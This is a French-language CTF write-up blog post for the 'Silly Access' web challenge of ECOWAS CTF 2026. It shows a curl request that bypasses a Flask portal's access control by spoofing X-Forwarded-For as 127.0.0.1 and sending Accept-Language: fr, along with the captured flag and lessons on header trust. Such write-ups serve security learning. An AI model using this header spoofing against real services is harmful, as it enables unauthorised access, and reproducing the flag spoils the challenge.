---
layout: post
title: "ECOWAS CTF 2026 — Silly Access [Web/200pts]"
date: 2026-04-24 10:50:00 +0000
categories: [CTF, ECOWAS-CTF-2026]
tags: [web, header-spoofing, x-forwarded-for, accept-language, access-control, flask, ecowas-languages]
toc: true
---

> **CTF :** ECOWAS CTF 2026 · **Catégorie :** Web · **Difficulté :** ⭐⭐ (Medium) · **Points :** 200  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**

---

## Description

Un portail diplomatique ECOWAS. Accès réservé aux locaux... et aux diplomates.

---

## Analyse

Le endpoint `/portal` renvoie un **403** avec deux messages d'erreur distincts :
1. *"Access restricted to internal network"* → vérification par IP via `X-Forwarded-For`
2. *"Language not supported"* → vérification de la langue via `Accept-Language`

Les deux restrictions doivent être contournées **simultanément**.

**ECOWAS languages :** français, anglais, portugais (langues officielles des pays membres)

---

## Solution

```bash
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "Accept-Language: fr" \
     http://challenge-url/portal
```

**Réponse :**
```json
{
  "flag": "EcowasCTF{h34d3rs_sp00f3d_dipl0m@t_@ccess}",
  "message": "Bienvenue, diplomate!"
}
```

### Pourquoi ça marche

1. `X-Forwarded-For: 127.0.0.1` → l'application Flask lit ce header sans validation de la source
2. `Accept-Language: fr` → le français est une langue ECOWAS, validation côté serveur via `Accept-Language`

### Méthodologie de découverte

```bash
# 1. Fuzzing de base
curl http://challenge-url/ → 200
curl http://challenge-url/portal → 403 + messages d'erreur révélateurs

# 2. Lire les messages d'erreur → ils donnent directement les contraintes
# 3. Construire la requête avec les deux headers
```

---

## Flag

```text
EcowasCTF{h34d3rs_sp00f3d_dipl0m@t_@ccess}
```

---

## Leçons retenues

- `X-Forwarded-For` : jamais faire confiance à ce header côté serveur sans validation de la chaîne de proxies
- Les messages d'erreur détaillés sont une mine d'or pour l'attaquant — ici ils révèlent directement les deux contraintes
- ECOWAS = 15 pays, 3 langues officielles (fr/en/pt) → connaître le contexte culturel aide

**[← Retour à l'index ECOWAS CTF 2026](/portfolio/blog/posts/ecowas-ctf-2026/)**
